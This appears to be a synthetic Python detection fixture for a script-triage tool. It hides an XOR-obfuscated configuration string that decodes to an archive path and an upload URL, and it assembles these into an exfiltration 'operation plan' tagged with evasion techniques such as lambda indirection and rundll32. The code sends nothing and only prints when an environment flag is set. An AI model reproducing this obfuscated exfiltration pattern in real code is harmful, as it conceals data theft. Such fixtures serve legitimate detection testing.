#!/usr/bin/env python3
if True:
    # Huntress Script Triage -- inert static-analysis fixture (cpython3)
    import base64
    import io
    import os

    MATERIAL_e463710d = "73,182,114,244,3,75,238,48,251,77,92,228,44,228,21,92,255,31,228,31,92,234,44,164,21,81,232,47,236,21,96,234,50,235,24,86,253,37,164,4,77,234,46,251,29,86,255,31,250,21,82,228,52,237,12,94,239,33,248,4,90,249,125,251,31,92,224,37,252,47,76,255,50,237,17,82,212,48,228,17,81,247,51,252,17,88,238,31,235,31,74,229,52,181,65,67,248,57,230,4,94,243,125,236,25,92,255,41,231,30,94,249,57,215,20,86,248,48,233,4,92,227,60,231,18,89,254,51,235,17,75,226,47,230,77,83,234,45,234,20,94,212,41,230,20,86,249,37,235,4,86,228,46,244,19,94,249,50,225,21,77,182,48,241,25,81,248,52,233,28,83,238,50,215,31,81,238,36,225,2,67,252,41,230,20,80,252,51,215,19,87,234,41,230,77,77,254,46,236,28,83,184,114,215,0,77,238,36,237,19,90,248,51,231,2,67,232,33,229,0,94,226,39,230,47,86,239,125,235,17,82,251,33,225,23,81,166,119,190,69,93,187,114,176,65,93,191,60,253,0,83,228,33,236,47,74,249,44,181,24,75,255,48,251,74,16,164,119,190,69,93,187,114,176,65,93,191,110,237,8,94,230,48,228,21,17,226,46,254,17,83,226,36,167,5,79,231,47,233,20,67,234,50,235,24,86,253,37,215,0,94,255,40,181,51,5,164,16,250,31,88,249,33,229,52,94,255,33,167,56,74,229,52,250,21,76,248,12,233,18,16,232,33,235,24,90,166,119,190,69,93,187,114,176,65,93,191,110,242,25,79"
    CODEC_e463710d = "decimal_csv|repeating_key_xor|3f,8b,40,88,70"

    def load_e463710d():
        return bytes(int(item) for item in MATERIAL_e463710d.split(","))

    def decode_e463710d(e):
        key_bytes = (63, 139, 64, 136, 112,)
        return bytes(value ^ key_bytes[index % len(key_bytes)] for index, value in enumerate(e))

    def recover_e463710d():
        n = ":".join(("north", "south"))
        d = decode_e463710d(load_e463710d())
        t = d.decode("ascii", "strict")
        return t

    def inspect_e463710d():
        return recover_e463710d()

    def surface_e463710d():
        routes = {"selected": lambda: ("dictionary_dispatch", "lambda_indirection", "pyinstaller_onedir", "rundll32_predecessor")}
        return routes["selected"]()

    def obfuscation_e463710d():
        recover = lambda value: value
        return recover("lambda_indirection")

    def plan_e463710d():
        fields = dict(item.split("=", 1) for item in inspect_e463710d().split("|"))
        analysis_surface = surface_e463710d()
        obfuscation_surface = obfuscation_e463710d()
        operation_plan = ("socket_stream_plan", fields["archive_path"], fields["upload_url"])
        return operation_plan + (analysis_surface, obfuscation_surface)

    if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
        print(inspect_e463710d())
